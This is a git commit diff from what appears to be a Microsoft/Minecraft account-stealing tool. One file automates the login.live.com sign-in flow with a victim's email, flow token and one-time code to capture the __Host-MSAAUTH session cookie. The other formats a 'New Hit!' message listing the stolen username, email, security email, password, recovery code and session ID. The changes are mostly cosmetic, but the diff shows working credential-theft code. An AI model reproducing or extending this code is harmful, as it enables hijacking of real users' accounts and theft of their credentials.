92a955051769238e4868d25d7decec2809582e44
RandomVapeUser <salomaoiogourte31@gmail.com>
2025-12-09 20:24:58 +0000

    Minor Changes

--- views/utils/getMSAAUTH.py
+++ views/utils/getMSAAUTH.py
@@ -3,19 +3,18 @@ import requests
 import json
 
 # Gets __Host-MSAAUTH
-# Gotta recode cookies handling later
 def getMSAAUTH(email: str, flowToken: str, code: str = None):
     data = getLiveData()  # [urlPost, ppft, cookies, headers]
 
     if not code:
 
         loginData = requests.post(
-            url=data["urlPost"],
-            headers={
+            url = data["urlPost"],
+            headers = {
                 "Content-Type": "application/x-www-form-urlencoded",
             },
-            cookies=data["cookies"],
-            data={
+            cookies = data["cookies"],
+            data = {
                 "login": email,
                 "loginfmt": email,
                 "slk": flowToken,
@@ -34,12 +33,12 @@ def getMSAAUTH(email: str, flowToken: str, code: str = None):
                 cookies += cookie_header.split(";")[0] + "; "
 
         loginData = requests.post(
-            url=data["urlPost"],
-            headers={
+            url = data["urlPost"],
+            headers = {
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Cookie": cookies
             },
-            data={
+            data = {
                 "login": email,
                 "loginfmt": email,
                 "SentProofIDE": flowToken,
@@ -54,7 +53,8 @@ def getMSAAUTH(email: str, flowToken: str, code: str = None):
     else:
         return None
 
-    polish = requests.post(
+    # Polish
+    requests.post(
         url = "https://login.live.com/ppsecure/post.srf?uaid=c81c108c53b249209366161b56d8122b&pid=0&opid=C0104E8D0A7E348F&route=C532_SN1",
         headers = {
             "Cookie" : f"__Host-MSAAUTH={MSAAUTH}",
--- views/utils/startSecure.py
+++ views/utils/startSecure.py
@@ -22,14 +22,15 @@ def startSecuringAccount(email: str, device: str = None, code: str = None):
         title = f"New Hit!"
     )
 
-    # To replace oldEmail -> Email (New Alias)
-    hit_embed.add_field(name = "Username:\n", value = f"```{account["oldName"]}```\n")
-    hit_embed.add_field(name = "Method:\n", value = f"```{account["method"]}```")
-    hit_embed.add_field(name = "Capes:\n", value = f"```{account["capes"]}```\n")
-    hit_embed.add_field(name = "Email:\n", value = f"```{account["oldEmail"]}```")
-    hit_embed.add_field(name = "Security Email:\n", value = f"```{account["secEmail"]}```\n")
-    hit_embed.add_field(name = "Password:\n", value = f"```{account["password"]}```\n")
-    hit_embed.add_field(name = "Recovery Code:\n", value = f"```{account["recoveryCode"]}```")
+    # To replace oldEmail -> Email (New Main Alias)
+    hit_embed.add_field(name="Username", value=f"`{account["oldName"]}`", inline=False)
+    hit_embed.add_field(name="Method", value=f"`{account["method"]}`", inline=True)
+    hit_embed.add_field(name="Capes", value=f"`{account["capes"]}`", inline=True)
+    hit_embed.add_field(name="Email", value=f"`{account["oldEmail"]}`", inline=True)
+    hit_embed.add_field(name="Security Email", value=f"`{account["secEmail"]}`", inline=True)
+    hit_embed.add_field(name="Password", value=f"`{account["password"]}`", inline=False)
+    hit_embed.add_field(name="Recovery Code", value=f"`{account["recoveryCode"]}`", inline=False)
+
 
     if account["SSID"] != "Failed to Get":
         session_embed = Embed(
